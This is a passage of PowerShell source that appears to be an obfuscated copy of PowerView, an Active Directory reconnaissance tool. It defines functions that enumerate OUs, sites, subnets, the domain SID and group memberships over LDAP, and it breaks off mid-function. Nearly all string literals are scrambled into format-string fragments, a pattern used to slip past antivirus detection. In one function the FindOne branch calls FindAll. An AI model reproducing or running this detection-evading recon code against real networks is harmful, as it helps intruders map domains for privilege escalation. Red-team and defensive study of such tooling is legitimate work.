        if ($PSBoundParameters[("{1}{0}" -f 'main','Do')]) { $SearcherArguments[("{1}{0}"-f 'ain','Dom')] = $Domain }
        if ($PSBoundParameters[("{2}{1}{0}"-f 'perties','ro','P')]) { $SearcherArguments[("{0}{2}{1}" -f'Proper','es','ti')] = $Properties }
        if ($PSBoundParameters[("{0}{1}{2}"-f'Se','a','rchBase')]) { $SearcherArguments[("{1}{3}{2}{0}"-f'ase','S','B','earch')] = $SearchBase }
        if ($PSBoundParameters[("{0}{1}"-f'Se','rver')]) { $SearcherArguments[("{0}{1}" -f 'Ser','ver')] = $Server }
        if ($PSBoundParameters[("{0}{2}{1}" -f'Sear','Scope','ch')]) { $SearcherArguments[("{2}{0}{1}"-f'archS','cope','Se')] = $SearchScope }
        if ($PSBoundParameters[("{1}{2}{0}{3}"-f 'i','ResultPage','S','ze')]) { $SearcherArguments[("{1}{2}{0}{4}{3}" -f'tP','Re','sul','Size','age')] = $ResultPageSize }
        if ($PSBoundParameters[("{4}{0}{2}{3}{1}" -f 'er','mit','v','erTimeLi','S')]) { $SearcherArguments[("{0}{2}{3}{1}{4}"-f'Serv','eLimi','er','Tim','t')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{3}{1}{2}{0}"-f 's','ity','Mask','Secur')]) { $SearcherArguments[("{1}{2}{0}" -f 'Masks','Sec','urity')] = $SecurityMasks }
        if ($PSBoundParameters[("{0}{2}{1}" -f'T','mbstone','o')]) { $SearcherArguments[("{1}{0}"-f'e','Tombston')] = $Tombstone }
        if ($PSBoundParameters[("{1}{3}{0}{2}" -f'n','Cred','tial','e')]) { $SearcherArguments[("{2}{1}{0}"-f'ntial','e','Cred')] = $Credential }
        $OUSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($OUSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match ("{1}{2}{0}" -f '*','^O','U=.')) {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters[("{0}{1}"-f 'Dom','ain')]) -and (-not $PSBoundParameters[("{1}{0}{2}"-f'r','Sea','chBase')])) {
                        
                        
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose ('[Ge'+'t-'+'D'+'omainOU]'+' '+'E'+'xtracted'+' '+'dom'+'a'+'in '+"'$IdentityDomain' "+'fr'+'om '+"'$IdentityInstance'")
                        $SearcherArguments[("{0}{1}" -f 'Domai','n')] = $IdentityDomain
                        $OUSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $OUSearcher) {
                            Write-Warning ('[Get-Do'+'m'+'ainO'+'U'+'] '+'Unabl'+'e '+'to'+' '+'retri'+'e'+'ve '+'do'+'m'+'ain '+'sear'+'cher'+' '+'for'+' '+"'$IdentityDomain'")
                        }
                    }
                }
                else {
                    try {
                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace ("{0}{1}"-f '(..',')'),'\$1'
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters[("{0}{1}"-f'GPL','ink')]) {
                Write-Verbose ('[Get-D'+'om'+'ainO'+'U] '+'Searc'+'hin'+'g '+'for'+' '+'OUs'+' '+'w'+'ith '+"$GPLink "+'se'+'t '+'in'+' '+'th'+'e '+'gp'+'Lin'+'k '+'prop'+'er'+'ty')
                $Filter += "(gplink=*$GPLink*)"
            }

            if ($PSBoundParameters[("{0}{1}{2}"-f'L','D','APFilter')]) {
                Write-Verbose ('[Get-Domai'+'nOU'+']'+' '+'Using'+' '+'addi'+'tio'+'nal '+'LD'+'AP '+'fi'+'lter'+': '+"$LDAPFilter")
                $Filter += "$LDAPFilter"
            }

            $OUSearcher.filter = "(&(objectCategory=organizationalUnit)$Filter)"
            Write-Verbose "[Get-DomainOU] Get-DomainOU filter string: $($OUSearcher.filter) "

            if ($PSBoundParameters[("{2}{0}{1}" -f'd','One','Fin')]) { $Results = $OUSearcher.FindOne() }
            else { $Results = $OUSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    
                    $OU = $_
                }
                else {
                    $OU = Convert-LDAPProperty -Properties $_.Properties
                }
                $OU.PSObject.TypeNames.Insert(0, ("{1}{0}{2}{3}" -f'rV','Powe','ie','w.OU'))
                $OU
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose ('[Get-Do'+'ma'+'i'+'nOU]'+' '+'Err'+'or '+'di'+'spo'+'si'+'ng '+'of'+' '+'th'+'e '+'Res'+'ult'+'s '+'o'+'bject: '+"$_")
                }
            }
            $OUSearcher.dispose()
        }
    }
}


function Get-DomainSite {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{0}{2}"-f'P','PSSh','rocess','ould'}, '')]
    [OutputType({"{2}{0}{1}{3}" -f 'ower','View.S','P','ite'})]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{1}{0}" -f'me','Na'})]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias({"{1}{0}" -f'UID','G'})]
        $GPLink,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}"-f'Fi','lt','er'})]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}"-f 'P','ath','ADS'})]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{1}{0}{2}"-f 'rol','ont','ler','DomainC'})]
        [String]
        $Server,

        [ValidateSet({"{1}{0}"-f 'e','Bas'}, {"{0}{1}{2}"-f 'OneLe','ve','l'}, {"{0}{2}{1}" -f 'Subtr','e','e'})]
        [String]
        $SearchScope = ("{2}{0}{1}" -f'e','e','Subtr'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet({"{1}{0}"-f'cl','Da'}, {"{0}{1}"-f 'G','roup'}, {"{1}{0}"-f 'e','Non'}, {"{0}{1}"-f 'Ow','ner'}, {"{1}{0}" -f'l','Sac'})]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias({"{0}{2}{3}{1}" -f'Re','One','tur','n'})]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            ("{1}{0}{2}" -f 'ase','SearchB','Prefix') = ("{0}{1}{7}{6}{5}{3}{4}{2}"-f 'CN=','Sites,C','ion','r','at','u','ig','N=Conf')
        }
        if ($PSBoundParameters[("{0}{1}"-f 'Do','main')]) { $SearcherArguments[("{0}{1}{2}"-f 'Do','mai','n')] = $Domain }
        if ($PSBoundParameters[("{2}{1}{0}" -f 'rties','rope','P')]) { $SearcherArguments[("{1}{0}{2}" -f'ie','Propert','s')] = $Properties }
        if ($PSBoundParameters[("{2}{0}{1}" -f 'earch','Base','S')]) { $SearcherArguments[("{2}{0}{1}{3}" -f 'chB','a','Sear','se')] = $SearchBase }
        if ($PSBoundParameters[("{0}{1}"-f'Se','rver')]) { $SearcherArguments[("{1}{0}"-f'r','Serve')] = $Server }
        if ($PSBoundParameters[("{0}{1}{2}{3}" -f 'Sea','rchSco','p','e')]) { $SearcherArguments[("{0}{1}{2}" -f 'Search','Sco','pe')] = $SearchScope }
        if ($PSBoundParameters[("{0}{2}{1}" -f'R','sultPageSize','e')]) { $SearcherArguments[("{0}{2}{1}{3}" -f'ResultPa','z','geSi','e')] = $ResultPageSize }
        if ($PSBoundParameters[("{2}{3}{0}{1}" -f 'm','it','ServerTi','meLi')]) { $SearcherArguments[("{0}{2}{1}{3}" -f 'Server','i','TimeL','mit')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{2}{1}{0}" -f 'asks','rityM','Secu')]) { $SearcherArguments[("{2}{0}{1}" -f 'ecurityMas','ks','S')] = $SecurityMasks }
        if ($PSBoundParameters[("{1}{2}{0}" -f 'e','To','mbston')]) { $SearcherArguments[("{1}{0}" -f 'mbstone','To')] = $Tombstone }
        if ($PSBoundParameters[("{2}{0}{1}" -f'de','ntial','Cre')]) { $SearcherArguments[("{2}{1}{3}{0}"-f 'ial','de','Cre','nt')] = $Credential }
        $SiteSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($SiteSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match ("{0}{1}"-f'^CN','=.*')) {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters[("{1}{0}" -f'main','Do')]) -and (-not $PSBoundParameters[("{1}{2}{0}{3}" -f'a','Se','archB','se')])) {
                        
                        
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose ('[G'+'e'+'t-Dom'+'a'+'inSite] '+'Extra'+'c'+'ted '+'d'+'omain'+' '+"'$IdentityDomain' "+'fro'+'m '+"'$IdentityInstance'")
                        $SearcherArguments[("{1}{0}" -f 'ain','Dom')] = $IdentityDomain
                        $SiteSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $SiteSearcher) {
                            Write-Warning ('['+'Get-DomainS'+'ite]'+' '+'Una'+'b'+'le '+'to'+' '+'r'+'et'+'rieve '+'d'+'omai'+'n '+'se'+'arch'+'er '+'fo'+'r '+"'$IdentityDomain'")
                        }
                    }
                }
                else {
                    try {
                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace ("{0}{1}" -f '(.','.)'),'\$1'
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters[("{0}{1}"-f'GPLin','k')]) {
                Write-Verbose ('[G'+'et-Do'+'ma'+'inSite] '+'Sea'+'r'+'ching '+'for'+' '+'site'+'s '+'wit'+'h '+"$GPLink "+'s'+'et '+'in'+' '+'the'+' '+'gpLin'+'k'+' '+'pr'+'op'+'erty')
                $Filter += "(gplink=*$GPLink*)"
            }

            if ($PSBoundParameters[("{0}{1}{2}"-f 'LDAP','Filte','r')]) {
                Write-Verbose ('[Ge'+'t-Domain'+'S'+'ite]'+' '+'Usin'+'g '+'addition'+'a'+'l '+'LDA'+'P '+'filter'+': '+"$LDAPFilter")
                $Filter += "$LDAPFilter"
            }

            $SiteSearcher.filter = "(&(objectCategory=site)$Filter)"
            Write-Verbose "[Get-DomainSite] Get-DomainSite filter string: $($SiteSearcher.filter) "

            if ($PSBoundParameters[("{0}{1}"-f 'Fi','ndOne')]) { $Results = $SiteSearcher.FindAll() }
            else { $Results = $SiteSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    
                    $Site = $_
                }
                else {
                    $Site = Convert-LDAPProperty -Properties $_.Properties
                }
                $Site.PSObject.TypeNames.Insert(0, ("{0}{2}{3}{1}"-f 'P','ew.Site','ower','Vi'))
                $Site
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose ("{9}{6}{5}{10}{13}{12}{8}{2}{14}{1}{11}{7}{0}{4}{3}" -f'e','di','o','esults object',' R','i','inS','h','rr','[Get-Doma','t','sposing of t','] E','e','r ')
                }
            }
            $SiteSearcher.dispose()
        }
    }
}


function Get-DomainSubnet {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{0}{3}" -f'ldProces','ou','PSSh','s'}, '')]
    [OutputType({"{4}{2}{3}{1}{0}" -f'ubnet','S','owe','rView.','P'})]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{0}{1}" -f 'Na','me'})]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $SiteName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'er','Filt'})]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'A','DSPath'})]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{3}{0}{4}" -f 'r','Dom','a','inCont','oller'})]
        [String]
        $Server,

        [ValidateSet({"{0}{1}"-f 'B','ase'}, {"{1}{2}{0}"-f'Level','O','ne'}, {"{1}{0}" -f'ree','Subt'})]
        [String]
        $SearchScope = ("{1}{0}"-f 'ree','Subt'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet({"{1}{0}" -f 'cl','Da'}, {"{0}{1}" -f 'Gro','up'}, {"{1}{0}" -f 'ne','No'}, {"{1}{0}" -f 'r','Owne'}, {"{1}{0}"-f'l','Sac'})]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias({"{2}{0}{1}"-f 'On','e','Return'})]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            ("{0}{4}{2}{3}{1}{5}" -f'S','Pr','chBas','e','ear','efix') = ("{5}{0}{2}{4}{6}{3}{1}" -f'bn','nfiguration','ets','Co',',','CN=Su','CN=Sites,CN=')
        }
        if ($PSBoundParameters[("{2}{1}{0}"-f'main','o','D')]) { $SearcherArguments[("{0}{1}"-f 'Do','main')] = $Domain }
        if ($PSBoundParameters[("{0}{2}{1}{3}" -f'Pr','rti','ope','es')]) { $SearcherArguments[("{3}{2}{1}{0}"-f'rties','pe','ro','P')] = $Properties }
        if ($PSBoundParameters[("{2}{0}{1}"-f'chBa','se','Sear')]) { $SearcherArguments[("{2}{1}{0}" -f'ase','hB','Searc')] = $SearchBase }
        if ($PSBoundParameters[("{0}{1}" -f'Serve','r')]) { $SearcherArguments[("{0}{1}"-f 'Ser','ver')] = $Server }
        if ($PSBoundParameters[("{1}{0}{2}"-f'hSco','Searc','pe')]) { $SearcherArguments[("{0}{2}{1}" -f 'Sear','e','chScop')] = $SearchScope }
        if ($PSBoundParameters[("{2}{0}{3}{1}"-f'esul','e','R','tPageSiz')]) { $SearcherArguments[("{1}{3}{2}{0}"-f'eSize','R','tPag','esul')] = $ResultPageSize }
        if ($PSBoundParameters[("{3}{0}{2}{4}{1}" -f'rTi','t','me','Serve','Limi')]) { $SearcherArguments[("{3}{1}{0}{2}"-f'verT','r','imeLimit','Se')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{0}{2}{1}{3}"-f 'Se','sk','curityMa','s')]) { $SearcherArguments[("{2}{3}{0}{1}" -f 'yMask','s','Secu','rit')] = $SecurityMasks }
        if ($PSBoundParameters[("{0}{2}{1}" -f'Tombst','e','on')]) { $SearcherArguments[("{0}{2}{1}"-f'Tomb','e','ston')] = $Tombstone }
        if ($PSBoundParameters[("{3}{0}{1}{2}" -f 'e','nt','ial','Cred')]) { $SearcherArguments[("{1}{0}{2}{3}"-f'den','Cre','tia','l')] = $Credential }
        $SubnetSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($SubnetSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match ("{0}{2}{1}"-f'^CN','.*','=')) {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters[("{0}{1}" -f 'Dom','ain')]) -and (-not $PSBoundParameters[("{0}{2}{1}" -f'S','archBase','e')])) {
                        
                        
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose ('[Ge'+'t-Domain'+'Subn'+'et'+'] '+'Extra'+'cte'+'d '+'do'+'main'+' '+"'$IdentityDomain' "+'fro'+'m '+"'$IdentityInstance'")
                        $SearcherArguments[("{0}{1}"-f'Domai','n')] = $IdentityDomain
                        $SubnetSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $SubnetSearcher) {
                            Write-Warning ('['+'G'+'et-'+'Do'+'ma'+'inSubne'+'t] '+'Una'+'ble '+'t'+'o '+'retr'+'iev'+'e '+'domai'+'n '+'search'+'er '+'fo'+'r '+"'$IdentityDomain'")
                        }
                    }
                }
                else {
                    try {
                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace (("{1}{0}" -f ')','(..')),'\$1'
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters[("{0}{2}{1}"-f'LDAP','ilter','F')]) {
                Write-Verbose ('['+'Get-'+'Doma'+'in'+'S'+'ubnet] '+'Usin'+'g '+'addit'+'iona'+'l'+' '+'LD'+'AP '+'filte'+'r: '+"$LDAPFilter")
                $Filter += "$LDAPFilter"
            }

            $SubnetSearcher.filter = "(&(objectCategory=subnet)$Filter)"
            Write-Verbose "[Get-DomainSubnet] Get-DomainSubnet filter string: $($SubnetSearcher.filter) "

            if ($PSBoundParameters[("{1}{2}{0}"-f'e','Fin','dOn')]) { $Results = $SubnetSearcher.FindOne() }
            else { $Results = $SubnetSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    
                    $Subnet = $_
                }
                else {
                    $Subnet = Convert-LDAPProperty -Properties $_.Properties
                }
                $Subnet.PSObject.TypeNames.Insert(0, ("{2}{1}{3}{0}"-f 'et','rView.Sub','Powe','n'))

                if ($PSBoundParameters[("{0}{1}{2}"-f 'S','iteN','ame')]) {
                    
                    
                    if ($Subnet.properties -and ($Subnet.properties.siteobject -like "*$SiteName*")) {
                        $Subnet
                    }
                    elseif ($Subnet.siteobject -like "*$SiteName*") {
                        $Subnet
                    }
                }
                else {
                    $Subnet
                }
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose ('[Get'+'-'+'D'+'omainSub'+'n'+'et] '+'Err'+'o'+'r '+'disp'+'os'+'ing '+'of'+' '+'the'+' '+'Results'+' '+'objec'+'t: '+"$_")
                }
            }
            $SubnetSearcher.dispose()
        }
    }
}


function Get-DomainSID {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{1}" -f 'dProces','s','PSShoul'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}{3}"-f 'D','ai','om','nController'})]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $SearcherArguments = @{
        ("{2}{1}{0}"-f'r','DAPFilte','L') = (("{8}{7}{11}{12}{3}{2}{4}{6}{10}{13}{9}{1}{0}{5}"-f'92','81','l:','ntro','1.2.840',')','.1','erAccount','(us','1.4.803:=','1355','C','o','6.'))
    }
    if ($PSBoundParameters[("{2}{0}{1}"-f'omai','n','D')]) { $SearcherArguments[("{0}{1}"-f 'Dom','ain')] = $Domain }
    if ($PSBoundParameters[("{0}{2}{1}" -f'Se','r','rve')]) { $SearcherArguments[("{0}{1}{2}"-f 'S','er','ver')] = $Server }
    if ($PSBoundParameters[("{0}{2}{1}"-f'C','ential','red')]) { $SearcherArguments[("{3}{0}{2}{1}" -f'red','ntial','e','C')] = $Credential }

    $DCSID = Get-DomainComputer @SearcherArguments -FindOne | Select-Object -First 1 -ExpandProperty objectsid

    if ($DCSID) {
        $DCSID.SubString(0, $DCSID.LastIndexOf('-'))
    }
    else {
        Write-Verbose ('[Ge'+'t-'+'Doma'+'inSID] '+'Err'+'or '+'ext'+'racting'+' '+'do'+'ma'+'in '+'S'+'ID '+'fo'+'r '+"'$Domain'")
    }
}


function Get-DomainGroup {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{4}{2}{0}"-f'cess','PS','o','ShouldP','r'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{4}{2}{5}{7}{6}{8}{0}{10}{1}{9}" -f 'As','en','aredV','PSU','seDecl','ar','oreT','sM','han','ts','signm'}, '')]
    [OutputType({"{0}{3}{1}{2}{4}"-f 'P','erVie','w.Grou','ow','p'})]
    [CmdletBinding(DefaultParameterSetName = {"{3}{1}{0}{2}"-f 'a','Deleg','tion','Allow'})]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{0}{4}{2}{3}{1}" -f'Dis','me','inguishe','dNa','t'}, {"{1}{2}{0}" -f'ountName','S','amAcc'}, {"{1}{0}"-f 'me','Na'}, {"{5}{2}{0}{3}{1}{4}" -f 'istin','a','D','guishedN','me','Member'}, {"{2}{0}{3}{1}"-f 'e','ame','Memb','rN'})]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}"-f'r','Use','Name'})]
        [String]
        $MemberIdentity,

        [Switch]
        $AdminCount,

        [ValidateSet({"{0}{1}{2}{3}"-f'Dom','a','inLoc','al'}, {"{1}{2}{3}{0}" -f'nLocal','NotDo','m','ai'}, {"{1}{0}" -f 'lobal','G'}, {"{0}{2}{1}" -f 'No','bal','tGlo'}, {"{3}{1}{0}{2}" -f 'versa','ni','l','U'}, {"{2}{3}{1}{0}"-f'l','iversa','N','otUn'})]
        [Alias({"{1}{0}" -f'cope','S'})]
        [String]
        $GroupScope,

        [ValidateSet({"{0}{1}{2}"-f 'Se','c','urity'}, {"{1}{3}{2}{0}" -f'on','Distri','i','but'}, {"{0}{3}{1}{2}" -f'C','at','edBySystem','re'}, {"{1}{3}{2}{0}" -f 'System','N','dBy','otCreate'})]
        [String]
        $GroupProperty,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'r','Filte'})]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}"-f 'SPa','th','AD'})]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{1}{2}{4}{0}" -f 'roller','mai','nCo','Do','nt'})]
        [String]
        $Server,

        [ValidateSet({"{1}{0}"-f'se','Ba'}, {"{0}{1}" -f 'OneLeve','l'}, {"{1}{2}{0}"-f'ree','Sub','t'})]
        [String]
        $SearchScope = ("{0}{1}" -f 'Subtre','e'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet({"{0}{1}"-f 'Dac','l'}, {"{1}{0}"-f 'oup','Gr'}, {"{1}{0}"-f'ne','No'}, {"{1}{0}" -f'ner','Ow'}, {"{0}{1}"-f'S','acl'})]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias({"{1}{0}{2}"-f 'ur','Ret','nOne'})]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[("{0}{2}{1}" -f'D','in','oma')]) { $SearcherArguments[("{0}{2}{1}" -f'Do','n','mai')] = $Domain }
        if ($PSBoundParameters[("{0}{2}{1}" -f'Pro','s','pertie')]) { $SearcherArguments[("{2}{0}{1}" -f'erti','es','Prop')] = $Properties }
        if ($PSBoundParameters[("{1}{2}{0}"-f'se','Sear','chBa')]) { $SearcherArguments[("{2}{0}{1}" -f'hBa','se','Searc')] = $SearchBase }
        if ($PSBoundParameters[("{0}{1}" -f'Serv','er')]) { $SearcherArguments[("{1}{0}"-f'er','Serv')] = $Server }
        if ($PSBoundParameters[("{1}{2}{0}{3}"-f 'rchSco','Se','a','pe')]) { $SearcherArguments[("{0}{1}{3}{2}"-f 'Sear','chS','pe','co')] = $SearchScope }
        if ($PSBoundParameters[("{0}{3}{2}{4}{1}" -f'Re','eSize','t','sul','Pag')]) { $SearcherArguments[("{4}{2}{3}{0}{1}"-f'Siz','e','esultP','age','R')] = $ResultPageSize }
        if ($PSBoundParameters[("{0}{1}{2}{3}"-f 'ServerTi','m','eLim','it')]) { $SearcherArguments[("{0}{2}{1}{3}"-f 'Ser','Lim','verTime','it')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{2}{0}{1}" -f'yM','asks','Securit')]) { $SearcherArguments[("{2}{0}{3}{1}"-f'urit','ks','Sec','yMas')] = $SecurityMasks }
        if ($PSBoundParameters[("{1}{0}" -f 'one','Tombst')]) { $SearcherArguments[("{0}{1}{2}"-f 'To','mb','stone')] = $Tombstone }
        if ($PSBoundParameters[("{2}{0}{1}"-f'enti','al','Cred')]) { $SearcherArguments[("{2}{1}{0}" -f 'ential','red','C')] = $Credential }
        $GroupSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($GroupSearcher) {
            if ($PSBoundParameters[("{1}{0}{3}{2}" -f 'berIde','Mem','ity','nt')]) {

                if ($SearcherArguments[("{0}{2}{1}"-f'Proper','s','tie')]) {
                    $OldProperties = $SearcherArguments[("{2}{1}{0}"-f'es','erti','Prop')]
                }

                $SearcherArguments[("{0}{1}" -f 'Id','entity')] = $MemberIdentity
                $SearcherArguments['Raw'] = $True

                Get-DomainObject @SearcherArguments | ForEach-Object {
                    
                    $ObjectDirectoryEntry = $_.GetDirectoryEntry()

                    
                    $ObjectDirectoryEntry.RefreshCache(("{1}{0}{2}{3}" -f 'ok','t','en','Groups'))

                    $ObjectDirectoryEntry.TokenGroups | ForEach-Object {
                        
                        $GroupSid = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value

                        
                        if ($GroupSid -notmatch ("{1}{3}{2}{0}"-f '*','^','-5-32-.','S-1')) {
                            $SearcherArguments[("{0}{2}{1}" -f'I','tity','den')] = $GroupSid
                            $SearcherArguments['Raw'] = $False
                            if ($OldProperties) { $SearcherArguments[("{0}{1}{2}"-f 'Prope','r','ties')] = $OldProperties }
                            $Group = Get-DomainObject @SearcherArguments
                            if ($Group) {
                                $Group.PSObject.TypeNames.Insert(0, ("{2}{1}{0}" -f'View.Group','ower','P'))
                                $Group
                            }
                        }
                    }
                }
            }
            else {
                $IdentityFilter = ''
                $Filter = ''
                $Identity | Where-Object {$_} | ForEach-Object {
                    $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($IdentityInstance -match ("{1}{0}" -f'-1-','^S')) {
                        $IdentityFilter += "(objectsid=$IdentityInstance)"
                    }
                    elseif ($IdentityInstance -match ("{1}{0}"-f '=','^CN')) {
                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                        if ((-not $PSBoundParameters[("{2}{0}{1}"-f'o','main','D')]) -and (-not $PSBoundParameters[("{0}{1}{2}{3}" -f'Sear','c','hBas','e')])) {
                            
                            
                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose ('[Ge'+'t-Dom'+'a'+'i'+'nGroup] '+'Ex'+'tract'+'ed '+'d'+'omain'+' '+"'$IdentityDomain' "+'fro'+'m '+"'$IdentityInstance'")
                            $SearcherArguments[("{1}{0}{2}"-f 'i','Doma','n')] = $IdentityDomain
                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
                            if (-not $GroupSearcher) {
                                Write-Warning ('[G'+'et-Doma'+'i'+'nGr'+'oup] '+'U'+'nable '+'t'+'o '+'retrie'+'ve'+' '+'domai'+'n '+'se'+'arc'+'he'+'r '+'fo'+'r '+"'$IdentityDomain'")
                            }
                        }
                    }
                    elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
